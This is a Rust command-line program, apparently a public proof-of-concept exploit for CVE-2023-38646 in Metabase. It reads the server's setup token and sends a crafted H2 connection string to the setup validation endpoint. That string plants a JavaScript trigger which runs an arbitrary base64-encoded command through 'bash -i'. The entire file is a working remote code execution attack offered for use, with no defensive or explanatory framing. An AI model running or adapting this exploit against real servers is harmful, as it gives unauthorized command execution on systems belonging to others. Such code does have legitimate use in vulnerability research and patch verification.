use clap::Parser;
use std::process::exit;
use reqwest;
use serde_json::{self, json};
use serde::Deserialize;
use base64::{Engine as _, engine::general_purpose};

#[derive(Parser)]
#[clap(name="cve_2023_38646", author="joaojj)",about="CVE-2023-38646", long_about = None)]
struct Args {
    #[clap(short, long, required = true, help = "Insert URL")]
    url: String,

    #[clap(short, long, required = true, help = "Insert command")]
    command: String,
}

async fn exploit_shell(token: String, command: String, url: String) {
    let command_base64 = general_purpose::STANDARD_NO_PAD.encode(command);

    let request_json = json!({
        "token": token,
        "details": {
            "is_on_demand": false,
            "is_full_sync": false,
            "is_sample": false,
            "cache_ttl": "null",
            "refingerprint": false,
            "auto_run_queries": true,
            "schedules": {},
            "details": {
                "db": format!("zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command_base64}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"),
                "advanced-options": false,
                "ssl": true
            },
            "name": "an-sec-research-team",
            "engine": "h2",
        }
    });
    let client = reqwest::Client::new();
    let url = format!("{}/api/setup/validate", url);
    let _response = client
        .post(url)
        .json(&request_json)
        .send()
        .await
        .unwrap_or_else(|_e| {
            eprintln!("[!] Exploit failed!");
            exit(0);
        });
    
    println!("[+] Exploit Success!")
    
}

#[derive(Deserialize)]
struct Token {
    #[serde(rename = "setup-token")]
    setup_token: String,
}

async fn token(url: &str) -> Result<String, String> {
    let url = format!("{}/api/session/properties", url);
    let response = reqwest::get(&url).await.unwrap();
    if response.status().is_success() {
        let body = response.text().await.unwrap();
        let token_json: Token = serde_json::from_str(&body).map_err(|_e| "Error")?;
        println!("[+] Token: {}", token_json.setup_token);
        Ok(token_json.setup_token)
    } else {
        Err(String::from("[!] Error getting token"))
    }
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    match token(&args.url).await {
        Ok(token) => {
            exploit_shell(token, args.command, args.url).await;
        }, 
        Err(err) => eprintln!("{}", err)
    }
}